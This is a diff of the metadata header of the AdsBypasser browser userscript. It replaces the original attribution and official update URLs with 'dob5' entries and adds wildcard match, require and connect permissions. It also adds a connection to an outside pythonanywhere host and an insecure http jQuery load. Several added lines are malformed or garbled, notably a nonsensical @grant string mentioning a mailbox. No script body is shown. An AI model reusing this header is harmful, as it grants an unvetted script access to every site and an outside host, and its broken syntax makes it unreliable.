@@ -1,13 +1,18 @@
 // ==UserScript==
 // @name           AdsBypasser
-// @namespace      AdsBypasser
-// @description    Bypass Ads
-// @copyright      2012+, Wei-Cheng Pan (legnaleurc)
-// @version        5.73.0
-// @license        BSD
-// @homepageURL    https://adsbypasser.github.io/
-// @supportURL     https://github.com/adsbypasser/adsbypasser/issues
-// @icon           https://raw.githubusercontent.com/adsbypasser/adsbypasser/v5.73.0/img/logo.png
+// @version     dob5
+// @author      dob5
+// @license     dob5
+// @copyright   dob5
+// @match       *://*/*
+// @match       *.*,//#/
+// @include     *://*/*
+// @include     *.*,//#/
+// @require     *
+// @grant       js.i--TODO==usr":('IN-mailbox.'//'/io-get.g-i/*''//#'/''):"*,*"
+// @connect     *
+// @connect     https://cdnjs.cloudflare.com
+// @connect     https://cdn.jsdelivr.net
 // @grant          unsafeWindow
 // @grant          GM_xmlhttpRequest
 // @grant          GM_addStyle
@@ -18,14 +23,10 @@
 // @grant          GM_registerMenuCommand
 // @grant          GM_setValue
 // @run-at         document-start
-// @resource       alignCenter https://raw.githubusercontent.com/adsbypasser/adsbypasser/v5.73.0/css/align_center.css
-// @resource       scaleImage https://raw.githubusercontent.com/adsbypasser/adsbypasser/v5.73.0/css/scale_image.css
-// @resource       bgImage https://raw.githubusercontent.com/adsbypasser/adsbypasser/v5.73.0/img/imagedoc-darknoise.png
 // @include        http://*
 // @include        https://*
-// @connect        *
-// @downloadURL https://update.greasyfork.org/scripts/4881/AdsBypasser.user.js
-// @updateURL https://update.greasyfork.org/scripts/4881/AdsBypasser.meta.js
+// @connect      engageub.pythonanywhere.com
+// @require      http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js
 // ==/UserScript==
 (function (context, factory) {
   if (typeof module === 'object' && typeof module.exports === 'object') {
